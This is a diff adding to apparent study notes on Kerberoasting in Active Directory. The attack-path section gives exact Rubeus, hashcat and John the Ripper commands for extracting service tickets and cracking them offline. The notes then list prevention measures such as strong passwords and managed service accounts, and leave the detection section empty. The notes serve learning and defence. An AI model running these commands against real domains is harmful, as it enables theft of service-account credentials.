@@ -11,4 +11,58 @@ Attack Path:
 
   - To obtain crackable tickets, use Rubeus https://github.com/GhostPack/Rubeus
 
+  - Run tool with the kerberoast action
+    .\Rubeus.exe kerberoast /outfile:spn.txt
+      - Extracts kerberoastable tickets for all users and saves them to a text file spn.txt
+
+  - Next, extract file with the tickets to kali machine in order to crack the hashes
+
+  - Utilize hashcat to crack:
+    hashcat -m 13100 -a 0 spn.txt passwords.txt --outfile="cracked.txt"
+      - (-m) is the hash type and 13100 is the value == TGS kerberos TGS hash)
+      - (-a) is the attack mode with value of 0 which is straight mode
+      - spn.txt is the file with the hashes we are trying to crack
+      - passwords.txt is the dictionary file with possible passwords.
+
+  - Can also use john the ripper as an alternative way to crack the hash
+    sudo john spn.txt --fork=4 --format=krb5tgs --wordlist=passwords.txt --pot=results.pot
+
+
+
+
+Prevention:
+
+  - Success of this attack is on the strength of the service account's password
+
+  - Limit the number of accounts with SPNs and disable those no longer used/needed
+
+  - Ensure strong password complexity policies
+
+  - Password should be 100+ random characters (127 being maximum allowed in AD)
+
+  - Can also use Group Managed Service Accounts (GMSA)
+    - Type of service account that AD automatically manages
+    - Auto rotates the password of these accounts to a random 127 characters value
+    - Caveat is that not all applications support these accounts, as they work mainly with Microsoft services such as IIS and SQL and a few other apps that have made       
+    integration possible
+  
+  - Ensure regular clea up of SPNs set to no longer valid services/servers
+
+
+
+Detection:
+
   - 
+
+
+
+
+
+
+
+
+
+
+
+
+
